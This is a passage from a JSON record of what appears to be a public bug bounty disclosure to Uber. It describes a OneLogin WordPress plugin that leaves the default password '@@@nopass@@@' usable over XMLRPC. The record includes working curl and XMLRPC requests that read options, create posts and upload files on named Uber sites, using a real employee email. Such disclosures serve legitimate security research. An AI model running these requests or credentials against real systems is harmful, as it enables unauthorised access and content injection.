attacker who doesn&#39;t have this information.</p>\n\n<p>A new post can be created with the following request. Without supplying a <code>post_status</code> parameter it will be saved as a draft, otherwise it will be published. It&#39;s also possible to create private posts too, e.g. for XSS-type attacks targeting administrators. The ability to create pages or posts depends on the user&#39;s privileges.</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot;?&gt;</span>\n<span class=\"nt\">&lt;methodCall&gt;</span>\n<span class=\"nt\">&lt;methodName&gt;</span>wp.newPost<span class=\"nt\">&lt;/methodName&gt;</span>\n<span class=\"nt\">&lt;params&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>what is this parameter<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>(INSERT USERNAME)<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>@@@nopass@@@<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;struct&gt;</span>\n                <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>post_title<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>bugbounty test post<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n                <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>post_content<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>any HTML content here<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n                <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>post_excerpt<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>excerpt<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n        <span class=\"nt\">&lt;/struct&gt;&lt;/param&gt;</span>\n<span class=\"nt\">&lt;/params&gt;</span>\n<span class=\"nt\">&lt;/methodCall&gt;</span>\n</code></pre>\n<p>I&#39;ve created some pages/posts on the said systems. As I saved them as drafts they can&#39;t be seen by normal users, but should be visible to administrators:</p>\n\n<ul>\n<li><a title=\"https://love.uber.com/australia/?page_id=6085\" href=\"/redirect?signature=a919eae8e6892c82ddd34656bac4984d8d598e3d&amp;url=https%3A%2F%2Flove.uber.com%2Faustralia%2F%3Fpage_id%3D6085\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://love.uber.com/australia/?page_id=6085</span><i class=\"icon-external-link\"></i></a></li>\n<li><a title=\"https://newsroom.uber.com/us-new-york/?p=2567\" href=\"/redirect?signature=cfcce262b6137833424463c35985386f3f043634&amp;url=https%3A%2F%2Fnewsroom.uber.com%2Fus-new-york%2F%3Fp%3D2567\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://newsroom.uber.com/us-new-york/?p=2567</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n\n<p>A file can be uploaded with a request like this:</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot;?&gt;</span>\n<span class=\"nt\">&lt;methodCall&gt;</span>\n<span class=\"nt\">&lt;methodName&gt;</span>metaWeblog.newMediaObject<span class=\"nt\">&lt;/methodName&gt;</span>\n<span class=\"nt\">&lt;params&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>what is this parameter<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>(INSERT USERNAME)<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>@@@nopass@@@<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;struct&gt;</span>\n                <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>name<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>file_name.html<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n                <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>type<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>text/plain<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n                <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>bits<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>file contents, any data format XML-encoded<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n        <span class=\"nt\">&lt;/struct&gt;&lt;/param&gt;</span>\n<span class=\"nt\">&lt;/params&gt;</span>\n<span class=\"nt\">&lt;/methodCall&gt;</span>\n</code></pre>\n<p>The ability to upload files and the allowed file extensions depend on the user privileges and WordPress settings.</p>\n\n<p>As a PoC I uploaded a file: <a title=\"https://love.uber.com/wp-content/uploads/sites/5/2016/05/fooasfasfgdg.key\" href=\"/redirect?signature=ac982304db3f3708dad0e4e68fed1b67871ee254&amp;url=https%3A%2F%2Flove.uber.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2016%2F05%2Ffooasfasfgdg.key\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://love.uber.com/wp-content/uploads/sites/5/2016/05/fooasfasfgdg.key</span><i class=\"icon-external-link\"></i></a><br>\nI tried a few file extensions but most were denied on that server. Depending on the server and WordPress configuration and the user&#39;s privileges, this may be used to perform various attacks such as XSS via *.html or *.swf or theoretically even direct RCE if the web server handles some of the allowed file formats as scripts or executables. </p>\n", 
    "vulnerability_information": "When a user logs on one of your WordPress sites via OneLogin, the authentication plugin creates a new entry in the WordPress user database with the default password `@@@nopass@@@`. This wouldn't be a problem if the plugin disabled all normal WordPress authentication methods, but it doesn't.\n\nThe OneLogin plugin does prevent logins through the normal *wp-login.php* page but fails to restrict the XMLRPC API. XMLRPC still honors the WordPress internal user database. Depending on the plugin settings, also the normal login page can be used with URL parameters: `wp-login.php?normal=1`. The settings did not allow this on the Uber sites I tried.\n\nAn attacker can exploit this bug by performing XMLRPC functions such as create new pages or posts and upload files. The attacker has to guess or know a username that has a default password and sufficient privileges to execute the operation. I haven't done an exhaustive test of all functions but some of them could probably be used to achieve remote code execution (e.g. creating posts containing JavaScript).\n\nThis probably affects most of your WordPress sites. I've confirmed this on *love.uber.com* and *newsroom.uber.com* by creating pages and posts (not public) and uploading files.\n\nThe XMLRPC system supports about 80 functions by default. Almost all of them require authentication. Plugins may add their own functions. Some of the function names:\n~~~~\nwp.deleteFile\nwp.editComment\nwp.getOptions\nwp.getUsers\nwp.newPage\nwp.newPost\nwp.setOptions\nwp.uploadFile\n~~~~\n#Reproducing#\nCreate an XML file named `options.xml` containing:\n~~~~ xml\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>wp.getOptions</methodName>\n<params>\n\t<param><value>zzz</value></param>\n        <param><value>cbarry@uber.com</value></param>\n        <param><value>@@@nopass@@@</value></param>\n</params>\n</methodCall>\n~~~~\nRun the UNIX command:\n~~~~ sh\ncurl 'https://newsroom.uber.com/xmlrpc.php' --data-binary \"`cat options.xml`\" -H 'Content-type: application/xml'\n~~~~\nYou should get the response:\n~~~~ xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n  <params>\n    <param>\n      <value>\n      <struct>\n  <member><name>software_name</name><value><struct>\n  <member><name>desc</name><value><string>Software Name</string></value></member>\n  <member><name>readonly</name><value><boolean>1</boolean></value></member>\n  <member><name>value</name><value><string>WordPress</string></value></member>\n</struct></value></member>\n  <member><name>software_version</name><value><struct>\n  <member><name>desc</name><value><string>Software Version</string></value></member>\n  <member><name>readonly</name><value><boolean>1</boolean></value></member>\n  <member><name>value</name><value><string>4.4.3</string></value></member>\n</struct></value></member>\n  <member><name>blog_url</name><value><struct>\n  <member><name>desc</name><value><string>WordPress Address (URL)</string></value></member>\n  <member><name>readonly</name><value><boolean>1</boolean></value></member>\n  <member><name>value</name><value><string>https://newsroom.uber.com</string></value></member>\n...etc.\n~~~~\n#Exploit scenarios#\nOptions in the above output that aren't marked *readonly* can also be changed. I didn't check if this is exploitable.\n\nFor usernames in these PoCs I used some *@uber.com email addresses I saw while testing previous bugs. They would be relatively easily guessable/findable for an attacker who doesn't have this information.\n\nA new post can be created with the following request. Without supplying a `post_status` parameter it will be saved as a draft, otherwise it will be published. It's also possible to create private posts too, e.g. for XSS-type attacks targeting administrators. The ability to create pages or posts depends on the user's privileges.\n~~~~ xml\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>wp.newPost</methodName>\n<params>\n        <param><value>what is this parameter</value></param>\n        <param><value>(INSERT USERNAME)</value></param>\n        <param><value>@@@nopass@@@</value></param>\n        <param><struct>\n                <member><name>post_title</name><value>bugbounty test post</value></member>\n                <member><name>post_content</name><value>any HTML content here</value></member>\n                <member><name>post_excerpt</name><value>excerpt</value></member>\n        </struct></param>\n</params>\n</methodCall>\n~~~~\nI've created some pages/posts on the said systems. As I saved them as drafts they can't be seen by normal users, but should be visible to administrators:\n* https://love.uber.com/australia/?page_id=6085\n* https://newsroom.uber.com/us-new-york/?p=2567\n\nA file can be uploaded with a request like this:\n~~~~ xml\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>metaWeblog.newMediaObject</methodName>\n<params>\n        <param><value>what is this parameter</value></param>\n        <param><value>(INSERT USERNAME)</value></param>\n        <param><value>@@@nopass@@@</value></param>\n        <param><struct>\n                <member><name>name</name><value>file_name.html</value></member>\n                <member><name>type</name><value>text/plain</value></member>\n                <member><name>bits</name><value>file contents, any data format XML-encoded</value></member>\n        </struct></param>\n</params>\n</methodCall>\n~~~~\nThe ability to upload files and the allowed file extensions depend on the user privileges and WordPress settings.\n\nAs a PoC I uploaded a file: https://love.uber.com/wp-content/uploads/sites/5/2016/05/fooasfasfgdg.key\nI tried a few file extensions but most were denied on that server. Depending on the server and WordPress configuration and the user's privileges, this may be used to perform various attacks such as XSS via *.html or *.swf or theoretically even direct RCE if the web server handles some of the allowed file formats as scripts or executables. ", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.uber.com", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Uber"
        }, 
        "handle": "uber", 
        "url": "https://hackerone.com/uber", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/314/826c90cba1555458df787ae914793cd5070e18df_small.png?1514905146", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 314, 
        "default_currency": "usd"
    }, 
    "is_published": false
}